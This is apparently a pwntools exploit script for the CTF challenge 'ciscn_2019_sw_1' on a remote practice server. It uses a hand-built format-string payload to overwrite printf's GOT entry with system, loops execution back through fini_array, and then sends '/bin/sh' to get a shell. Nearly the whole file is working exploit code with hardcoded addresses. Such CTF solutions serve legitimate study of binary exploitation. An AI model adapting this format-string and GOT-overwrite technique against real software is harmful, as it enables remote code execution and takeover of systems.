from pwn import *


# p = process("./ciscn_2019_sw_1")
p = remote("node4.buuoj.cn", 29530)
pro = ELF("./ciscn_2019_sw_1")


offset = 4
printf_g = 0x0804989C 
sys_p = 0x080483D0 
fini_arr = 0x0804979C
main = 0x08048534 


# use fmtstr_payload to generate pad, then change it
"""
writes = {
    printf_g: sys_p,
    fini_arr: start & 0xffff
}
pad = fmtstr_payload(4, writes=writes, write_size="short")
print(pad, len(pad))
"""
# "%34100c%13$n%261788c%14$n%56c%15$hhn\x9c\x97\x04\x08\x9c\x98\x04\x08\x9f\x98\x04\x08"

pad = "%34100c%14$hn%261788c%15$n%56c%16$hhnaaa\x9c\x97\x04\x08\x9c\x98\x04\x08\x9f\x98\x04\x08"
p.sendline(pad)
p.sendline("/bin/sh\x00")
p.interactive()


